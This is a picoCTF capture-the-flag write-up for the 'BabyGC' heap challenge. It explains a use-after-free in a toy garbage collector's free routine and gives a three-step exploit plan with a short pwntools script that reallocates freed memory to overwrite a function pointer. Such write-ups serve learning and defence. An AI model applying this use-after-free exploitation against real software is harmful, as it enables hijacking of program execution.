---
layout: layouts/entry-detail.njk
title: "picoCTF — BabyGC"
date: 2025-11-02
category: Pwn
platform: picoCTF
difficulty: Medium
tags: [heap, use-after-free, ctypes]
summary: "A minimal heap challenge exploited through a use-after-free in a custom allocator."
backLink: /writeups/
backLabel: Writeups
---

## Challenge overview

A stripped 64-bit binary implementing a toy garbage collector. The bug lives in how freed chunks are re-added to the free list without clearing the reference held by the "root" table.

## Finding the bug

```c
void free_obj(obj_t *o) {
    // BUG: root table entry is never cleared
    add_to_freelist(o);
}
```

Because the root table still points at the freed chunk, allocating a new object of the same size reuses that memory while the old reference is still reachable — a textbook use-after-free.

## Exploit strategy

1. Free an object holding a function pointer.
2. Reallocate a same-sized object and overwrite it with a fake pointer.
3. Trigger the original (stale) reference to redirect execution.

```python
from pwn import *

io = process("./babygc")
io.sendlineafter(b"> ", b"1")   # alloc
io.sendlineafter(b"> ", b"2")   # free
io.sendlineafter(b"> ", b"1")   # realloc, overwrite vtable
io.interactive()
```

## Takeaways

Custom allocators are a minefield — always double check that references are invalidated on free, not just added back to a free list.
